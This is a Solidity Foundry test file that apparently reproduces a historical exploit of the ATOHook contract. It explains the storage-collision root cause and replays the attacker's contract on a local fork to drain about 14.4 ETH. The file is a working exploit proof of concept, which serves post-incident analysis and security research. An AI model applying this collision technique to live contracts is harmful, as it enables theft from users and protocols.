// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~14.411518807585587 ETH (exactly 200 × 0xffffffffffffff wei)
// Attacker : 0x2d2aafc193c24e59bd16139056ac9b4df4d37ad0
// Attack Contract : 0x2441e480f62bf609a08da09143e4baf8a817d757
// Vulnerable Contract : 0xa10de71ddb4e0d51938ef6e0118822e157a62888 (ATOHook)
// Attack Tx (first drain, n=100) : https://etherscan.io/tx/0xeabb150cd728253c5d8844673c8d0687ab9881366ed1c9aad5b00016584e6392
// Attack Tx (n=200) : https://etherscan.io/tx/0xe4e2cc3b06144da48fa8577eb0059b713bcce97579bee59ec65c518a04716c6e
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xa10de71ddb4e0d51938ef6e0118822e157a62888#code
//
// @Analysis
// Root cause:
//  1. ATOHook inherits Solady ReentrancyGuard, which stores its lock at the fixed
//     namespaced slot
//     0x02215292eb9609279094554c6e223f800950648ddfa3da30329838d6c170928d.
//  2. Layout: rewards mapping is at base slot 17, so
//     keccak256(abi.encode(addr, 17)) for addr = attack contract equals that
//     exact Solady guard slot (storage collision).
//  3. getReward() is nonReentrant: entry sstores sentinel 0xffffffffffffff into
//     the guard slot; that value is then read as rewards[attackContract], paid
//     as ETH, zeroed, and exit sstores codesize() back into the same slot.
//  4. Repeating getReward() ~200× drains ~14.4115 ETH of inflated "rewards".
//
// PoC strategy: replay the historical attack contract at block 25244685
// (one before first drain). Call attack(hook, 200) then withdraw to EOA.

interface IATOHook {
    function rewards(address) external view returns (uint256);
    function getReward() external returns (uint256);
    function rewardPool() external view returns (uint256);
}

contract ATOHook_exp is BaseTestWithBalanceLog {
    address constant ATTACKER = 0x2D2AaFC193C24E59Bd16139056Ac9b4df4D37Ad0;
    address constant ATTACK_CONTRACT = 0x2441E480F62bf609A08dA09143e4BAf8a817D757;
    address constant ATO_HOOK = 0xA10De71ddB4E0d51938ef6e0118822e157a62888;

    // Solady ReentrancyGuard fixed storage slot
    bytes32 constant GUARD_SLOT = 0x02215292eb9609279094554c6e223f800950648ddfa3da30329838d6c170928d;
    // Solady nonReentrant entry sentinel
    uint256 constant SENTINEL = 0xffffffffffffff;
    // rewards mapping base slot in ATOHook storage layout
    uint256 constant REWARDS_BASE_SLOT = 17;

    // Historical attack selectors on 0x2441…
    // attack(address hook, uint256 n) — loops getReward() n times
    bytes4 constant SEL_ATTACK = 0x186091bf;
    // withdraw() — owner drains contract ETH to EOA
    bytes4 constant SEL_WITHDRAW = 0xf5c559d1;

    // First drain tx is in block 25244686; fork one before.
    uint256 constant ATTACK_BLOCK = 25_244_686;
    uint256 constant FORK_BLOCK = ATTACK_BLOCK - 1;

    // Exact SlowMist figure: 200 × 0xffffffffffffff wei
    uint256 constant EXPECTED_PROFIT = 200 * SENTINEL; // 14.411518807585587 ether

    function setUp() public {
        // Online warm: mainnet alias; exhaustive_warm rewrites to anvil localhost.
        vm.createSelectFork("http://127.0.0.1:8545", FORK_BLOCK);
        fundingToken = address(0); // native ETH
        attacker = ATTACKER;
    }

    function testExploit() public balanceLog {
        // --- prove storage collision ---
        bytes32 rewardsSlot = keccak256(abi.encode(ATTACK_CONTRACT, REWARDS_BASE_SLOT));
        require(rewardsSlot == GUARD_SLOT, "rewards[attack] != Solady guard slot");

        // Guard has already been exercised on-chain (any nonReentrant exit stores codesize()).
        // That value is therefore visible as rewards[ATTACK_CONTRACT] via the collision.
        uint256 codesizeVal = ATO_HOOK.code.length;
        uint256 rewardsView = IATOHook(ATO_HOOK).rewards(ATTACK_CONTRACT);
        require(rewardsView == codesizeVal, "pre-attack rewards view != codesize");
        require(uint256(vm.load(ATO_HOOK, GUARD_SLOT)) == codesizeVal, "guard slot != codesize");

        uint256 hookBalBefore = ATO_HOOK.balance;
        uint256 attackerBefore = ATTACKER.balance;
        require(hookBalBefore >= EXPECTED_PROFIT, "hook balance too low for 200 claims");

        // Replay historical attack path: loop getReward 200× then withdraw to EOA.
        vm.startPrank(ATTACKER, ATTACKER);
        (bool ok, bytes memory ret) =
            ATTACK_CONTRACT.call(abi.encodeWithSelector(SEL_ATTACK, ATO_HOOK, uint256(200)));
        require(ok, string(ret));

        (ok, ret) = ATTACK_CONTRACT.call(abi.encodeWithSelector(SEL_WITHDRAW));
        require(ok, string(ret));
        vm.stopPrank();

        uint256 profit = ATTACKER.balance - attackerBefore;
        uint256 hookLost = hookBalBefore - ATO_HOOK.balance;

        // Exact profit matches SlowMist: 200 × sentinel.
        assertEq(profit, EXPECTED_PROFIT, "attacker ETH profit mismatch");
        assertEq(hookLost, EXPECTED_PROFIT, "hook ETH drained mismatch");
        // After exit, guard/rewards[attack] is codesize again.
        assertEq(IATOHook(ATO_HOOK).rewards(ATTACK_CONTRACT), codesizeVal, "post guard");

        emit log_named_decimal_uint("Attacker ETH profit", profit, 18);
        emit log_named_decimal_uint("ATOHook ETH lost", hookLost, 18);
        emit log_named_uint("Claims (sentinel each)", 200);
        emit log_named_uint("Sentinel wei", SENTINEL);
        emit log_named_bytes32("Colliding slot", GUARD_SLOT);
    }
}
